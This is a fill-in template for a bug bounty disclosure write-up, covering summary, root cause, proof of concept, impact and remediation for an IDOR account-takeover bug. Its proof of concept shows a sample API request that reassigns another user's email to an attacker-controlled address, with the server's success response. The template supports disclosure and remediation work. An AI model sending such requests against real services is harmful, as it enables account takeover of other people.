# [Bug Bounty] Vulnerability Title (e.g. IDOR Leading to Account Takeover)

> **Program**: Target Corp  
> **Severity**: High / Critical  
> **Vulnerability Class**: IDOR / BOLA / Business Logic  
> **Bounty Awarded**: $X,XXX  
> **Date Disclosed**: YYYY-MM-DD  

---

## 1. Summary
A brief 2-3 sentence executive summary explaining what was found and the ultimate business impact.

---

## 2. Technical Root Cause
Explain why the vulnerability exists:
- Lack of object-level authorization checks.
- Trusting client-supplied identifier parameters.
- Missing tenant validation in backend database queries.

---

## 3. Proof of Concept (PoC)

### Request
```http
POST /api/v1/user/update-email HTTP/1.1
Host: target.com
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
  "user_id": 1337,
  "new_email": "attacker@evil.com"
}
```

### Response
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "success",
  "message": "Email updated successfully"
}
```

---

## 4. Impact
- **What can an attacker do right now?**
- Account takeover, unauthorized data access, PII leakage, or privilege escalation.

---

## 5. Remediation & Fix
Explain how the development team resolved the issue (e.g. enforcing server-side session user verification).
